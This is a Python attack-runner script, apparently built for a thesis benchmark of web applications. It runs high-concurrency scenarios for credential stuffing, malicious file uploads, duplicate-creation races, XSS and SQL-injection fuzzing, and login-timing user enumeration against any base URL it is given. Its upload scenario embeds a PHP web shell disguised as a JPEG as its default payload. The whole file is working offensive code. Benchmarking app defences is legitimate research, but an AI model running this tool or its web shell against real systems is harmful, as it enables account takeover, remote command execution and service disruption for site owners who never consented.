#!/usr/bin/env python3
"""
attacks/run_mcp_scenario.py
Concurrent attack runner for thesis benchmark.

Scenarios:
  auth_storm        - Credential stuffing / rate limit probe on login
  file_upload_race  - Concurrent malicious file uploads
  double_spend_race - Concurrent state-changing item creation
  fuzz_inputs       - Rotate XSS + SQLi payloads across input surfaces
  timing_probe      - Measure response time delta for user enumeration
"""

import argparse
import asyncio
import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    import aiohttp
except ImportError:
    print("Run: pip install aiohttp --break-system-packages", file=sys.stderr)
    sys.exit(1)

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
CONFIG_FILE = Path(__file__).resolve().parents[1] / "config" / "experiment_config.json"

DEFAULT_ENDPOINTS = {
    "login": "/login",
    "register": "/register",
    "dashboard": "/",
    "item_create": "/items",
    "item_list": "/items",
    "upload": "/upload",
    "logout": "/logout",
}

SUCCESS_STATUSES = {200, 201, 202, 204, 301, 302, 400, 401, 403, 404, 405, 406, 409, 422, 429}


def load_endpoints(app_id: str) -> dict:
    if CONFIG_FILE.exists():
        try:
            config = json.loads(CONFIG_FILE.read_text())
            if app_id in config and isinstance(config[app_id], dict):
                return {**DEFAULT_ENDPOINTS, **config[app_id]}
        except Exception:
            pass
    return DEFAULT_ENDPOINTS


def load_app_meta(app_id: str) -> dict:
    if CONFIG_FILE.exists():
        try:
            config = json.loads(CONFIG_FILE.read_text())
            meta = config.get(app_id, {})
            return meta if isinstance(meta, dict) else {}
        except Exception:
            pass
    return {}


def get_csrf_token_endpoint(app_id: str) -> str:
    meta = load_app_meta(app_id)
    token_ep = meta.get("csrf_token_endpoint", "/csrf-token")
    return token_ep if isinstance(token_ep, str) else "/csrf-token"


def app_requires_csrf(app_id: str) -> bool:
    meta = load_app_meta(app_id)
    return bool(meta.get("csrf_required", False))


async def fetch_csrf_token(session, base_url: str, app_id: str) -> str | None:
    token_ep = get_csrf_token_endpoint(app_id)
    try:
        async with session.get(f"{base_url}{token_ep}", allow_redirects=True) as resp:
            if resp.status != 200:
                return None
            data = await resp.json(content_type=None)
            if isinstance(data, dict):
                token = data.get("csrfToken")
                return token if isinstance(token, str) else None
    except Exception:
        pass
    return None


def load_lines(filename: str) -> list[str]:
    p = PAYLOAD_DIR / filename
    if p.exists():
        return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
    return ["test"]


def load_upload_payloads():
    d = PAYLOAD_DIR / "upload_payloads"
    results = []
    if d.exists():
        for f in sorted(d.iterdir()):
            if f.is_file():
                results.append((f.name, f.read_bytes()))
    return results or [("test.php.jpg", b"<?php system($_GET['cmd']); ?>")]


async def do_request(session, method, url, **kwargs):
    t0 = time.monotonic()
    try:
        async with session.request(method, url, allow_redirects=True, **kwargs) as resp:
            body = await resp.text(errors="replace")
            return {
                "status": resp.status,
                "elapsed_ms": round((time.monotonic() - t0) * 1000, 2),
                "body": body,
                "headers": dict(resp.headers),
                "network_ok": True,
                "ok": resp.status in SUCCESS_STATUSES,
            }
    except Exception as e:
        return {
            "status": 0,
            "elapsed_ms": round((time.monotonic() - t0) * 1000, 2),
            "body": str(e)[:150],
            "headers": {},
            "network_ok": False,
            "ok": False,
        }


def status_is_usable(status: int) -> bool:
    return status in SUCCESS_STATUSES or (200 <= status < 500)


async def ensure_authenticated(session, base_url: str, app_id: str, endpoints: dict) -> bool:
    register_ep = endpoints.get("register")
    login_ep = endpoints.get("login")
    if not register_ep or not login_ep:
        return False

    suffix = str(int(time.time() * 1000))
    username = f"bench_{suffix}"
    email = f"bench_{suffix}@test.local"
    password = f"BenchPass!{suffix[-6:]}"

    reg_url = f"{base_url}{register_ep}"
    login_url = f"{base_url}{login_ep}"

    reg_data = {
        "username": username,
        "email": email,
        "password": password,
        "confirm_password": password,
    }
    await do_request(session, "POST", reg_url, data=reg_data)

    login_data = {
        "username": username,
        "email": email,
        "password": password,
    }
    login_resp = await do_request(session, "POST", login_url, data=login_data)
    body = login_resp["body"].lower()

    return (
        login_resp["status"] in {200, 201, 302}
        or "logged in" in body
        or "welcome" in body
    )


async def auth_storm(session, base_url, idx, endpoints, csrf_token=None):
    url = f"{base_url}{endpoints['login']}"
    data = {
        "username": f"user{idx % 20}",
        "email": f"user{idx % 20}@test.com",
        "password": f"wrongpass{idx}",
    }
    headers = {"x-csrf-token": csrf_token} if csrf_token else {}
    result = await do_request(session, "POST", url, data=data, headers=headers)

    body = (result["body"] or "").lower()
    blocked = any(k in body for k in ["too many", "rate limit", "locked", "blocked", "try again later", "429"])
    result["ok"] = result["network_ok"] and result["status"] not in {0, 500, 502, 503, 504} and not blocked
    result["blocked_signal"] = blocked
    return result


async def file_upload_race(session, base_url, idx, endpoints, csrf_token=None):
    url = f"{base_url}{endpoints['upload']}"
    payloads = load_upload_payloads()
    name, content = payloads[idx % len(payloads)]

    form = aiohttp.FormData()
    form.add_field("file", content, filename=name, content_type="image/jpeg")
    form.add_field("submit", "Upload")
    headers = {"x-csrf-token": csrf_token} if csrf_token else {}

    result = await do_request(session, "POST", url, data=form, headers=headers)
    body = (result["body"] or "").lower()
    accepted = any(k in body for k in ["uploaded", "success", "file uploaded"])
    result["ok"] = result["network_ok"] and result["status"] not in {0, 500, 502, 503, 504}
    result["accepted_signal"] = accepted or result["status"] in {200, 201, 202, 302}
    return result


async def double_spend_race(session, base_url, idx, endpoints, csrf_token=None):
    url = f"{base_url}{endpoints['item_create']}"
    race_key = "race_shared_item"
    data = {
        "name": race_key,
        "description": f"race_test_{idx}",
        "submit": "Submit",
    }
    headers = {"x-csrf-token": csrf_token} if csrf_token else {}
    result = await do_request(session, "POST", url, data=data, headers=headers)
    result["race_key"] = race_key
    result["ok"] = result["network_ok"] and result["status"] not in {0, 500, 502, 503, 504}
    return result


async def fuzz_inputs(session, base_url, idx, endpoints, csrf_token=None):
    xss = load_lines("xss_payloads.txt")
    sqli = load_lines("sqli_payloads.txt")
    all_payloads = xss + sqli
    payload = all_payloads[idx % len(all_payloads)]

    fuzz_endpoints = [
        ep for ep in [
            endpoints.get("register"),
            endpoints.get("login"),
            endpoints.get("upload"),
            endpoints.get("dashboard"),
            endpoints.get("item_create"),
            endpoints.get("item_list"),
        ]
        if ep
    ]
    if not fuzz_endpoints:
        fuzz_endpoints = ["/"]

    path = fuzz_endpoints[idx % len(fuzz_endpoints)]
    url = f"{base_url}{path}"
    headers = {"x-csrf-token": csrf_token} if csrf_token else {}

    if idx % 2 == 0:
        params = {"q": payload, "search": payload}
        result = await do_request(session, "GET", url, params=params, headers=headers)
    else:
        data = {
            "username": payload,
            "email": f"test{idx}@x.com",
            "password": "testpass123",
            "confirm_password": "testpass123",
            "name": payload,
            "description": payload,
        }
        result = await do_request(session, "POST", url, data=data, headers=headers)

    body = result["body"] or ""
    body_lower = body.lower()

    reflected = payload in body or any(k in body_lower for k in ["sql", "syntax", "warning", "exception", "stack trace"])
    result["reflected_signal"] = reflected
    result["ok"] = result["network_ok"] and result["status"] not in {0, 500, 502, 503, 504}
    return result


async def timing_probe(session, base_url, idx, endpoints, csrf_token=None):
    url = f"{base_url}{endpoints['login']}"
    real_users = ["admin@admin.com", "admin@test.com", "user@test.com", "test@test.com", "root@root.com"]
    random_users = [f"zzznotreal{i}@fake.com" for i in range(10)]
    all_users = real_users + random_users
    email = all_users[idx % len(all_users)]

    data = {
        "username": email,
        "email": email,
        "password": "timing_probe_wrong_x9z",
    }
    headers = {"x-csrf-token": csrf_token} if csrf_token else {}
    result = await do_request(session, "POST", url, data=data, headers=headers)
    result["probed_email"] = email
    result["is_real_attempt"] = email in real_users
    result["ok"] = result["network_ok"] and result["status"] not in {0, 500, 502, 503, 504}
    return result


SCENARIOS = {
    "auth_storm": auth_storm,
    "file_upload_race": file_upload_race,
    "double_spend_race": double_spend_race,
    "fuzz_inputs": fuzz_inputs,
    "timing_probe": timing_probe,
}


async def run_scenario(app_id, scenario, concurrency, duration, base_url):
    fn = SCENARIOS[scenario]
    endpoints = load_endpoints(app_id)
    results = []
    errors = []
    semaphore = asyncio.Semaphore(concurrency)
    counter = {"idx": 0}
    stop = asyncio.Event()
    ts_start = datetime.now(timezone.utc).isoformat()

    connector = aiohttp.TCPConnector(limit=concurrency + 10, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        csrf_token = await fetch_csrf_token(session, base_url, app_id) if app_requires_csrf(app_id) else None

        if scenario in {"file_upload_race", "double_spend_race", "fuzz_inputs"}:
            await ensure_authenticated(session, base_url, app_id, endpoints)

        async def worker():
            async with semaphore:
                if stop.is_set():
                    return
                idx = counter["idx"]
                counter["idx"] += 1
                r = await fn(session, base_url, idx, endpoints, csrf_token=csrf_token)
                r["req_idx"] = idx
                results.append(r)
                if not r.get("ok", False):
                    errors.append({"req_idx": idx, "status": r["status"], "snippet": (r["body"] or "")[:150]})

        deadline = time.monotonic() + duration
        tasks = set()
        while time.monotonic() < deadline:
            if len(tasks) < concurrency * 2:
                t = asyncio.create_task(worker())
                tasks.add(t)
                t.add_done_callback(tasks.discard)
            else:
                await asyncio.sleep(0.005)

        stop.set()
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        if scenario == "double_spend_race" and results:
            race_key = results[0].get("race_key")
            duplicate_count = None
            if race_key:
                try:
                    check_url = f"{base_url}{endpoints['item_list']}"
                    check = await do_request(session, "GET", check_url)
                    duplicate_count = (check["body"] or "").count(race_key)
                except Exception:
                    duplicate_count = None
            for r in results:
                if duplicate_count is not None:
                    r.setdefault("extra", {})
                    r["extra"]["duplicate_count"] = duplicate_count

    ts_end = datetime.now(timezone.utc).isoformat()

    total = len(results)
    ok = sum(1 for r in results if r.get("ok"))
    times = sorted(r["elapsed_ms"] for r in results)
    n = len(times)

    timing = {}
    if n:
        timing = {
            "min_ms": times[0],
            "max_ms": times[-1],
            "mean_ms": round(sum(times) / n, 2),
            "p50_ms": times[n // 2],
            "p95_ms": times[min(n - 1, int(n * 0.95))],
            "p99_ms": times[min(n - 1, int(n * 0.99))],
        }

    extra = {}
    if scenario == "timing_probe" and results:
        real_times = [r["elapsed_ms"] for r in results if r.get("is_real_attempt")]
        random_times = [r["elapsed_ms"] for r in results if not r.get("is_real_attempt") and "is_real_attempt" in r]
        if real_times and random_times:
            delta = round((sum(real_times) / len(real_times)) - (sum(random_times) / len(random_times)), 2)
            extra["timing_delta_ms"] = delta
            extra["enumeration_signal"] = "YES" if abs(delta) > 10 else "NO"

    if scenario == "double_spend_race" and results:
        counts = [r.get("extra", {}).get("duplicate_count") for r in results if r.get("extra")]
        if counts:
            extra["duplicate_count"] = max(c for c in counts if isinstance(c, int)) if any(isinstance(c, int) for c in counts) else None

    return {
        "app_id": app_id,
        "attack": scenario,
        "concurrency": concurrency,
        "duration_s": duration,
        "endpoints_used": endpoints,
        "requests_total": total,
        "successful_requests": ok,
        "failed_requests": total - ok,
        "success_rate": round(ok / total, 4) if total else 0,
        "errors": errors[:30],
        "timing_stats": timing,
        "extra": extra,
        "timestamp_start": ts_start,
        "timestamp_end": ts_end,
    }


def main():
    parser = argparse.ArgumentParser(description="Concurrent attack runner")
    parser.add_argument("--app-id", required=True)
    parser.add_argument("--scenario", required=True, choices=list(SCENARIOS.keys()))
    parser.add_argument("--concurrency", type=int, default=50)
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--out", required=True)
    parser.add_argument("--base-url", default=os.getenv("TARGET_BASE_URL", "http://localhost:8080"))
    args = parser.parse_args()

    Path(args.out).parent.mkdir(parents=True, exist_ok=True)

    print(f"[*] {args.app_id} | {args.scenario} | c={args.concurrency} | t={args.duration}s | {args.base_url}")
    result = asyncio.run(run_scenario(
        args.app_id, args.scenario, args.concurrency, args.duration, args.base_url
    ))

    Path(args.out).write_text(json.dumps(result, indent=2))
    sr = result["success_rate"]
    print(f"[+] {result['requests_total']} requests | {result['successful_requests']} ok ({sr:.0%}) | p50={result['timing_stats'].get('p50_ms', '?')}ms")
    if result["extra"]:
        for k, v in result["extra"].items():
            print(f"    {k}: {v}")


if __name__ == "__main__":
    main()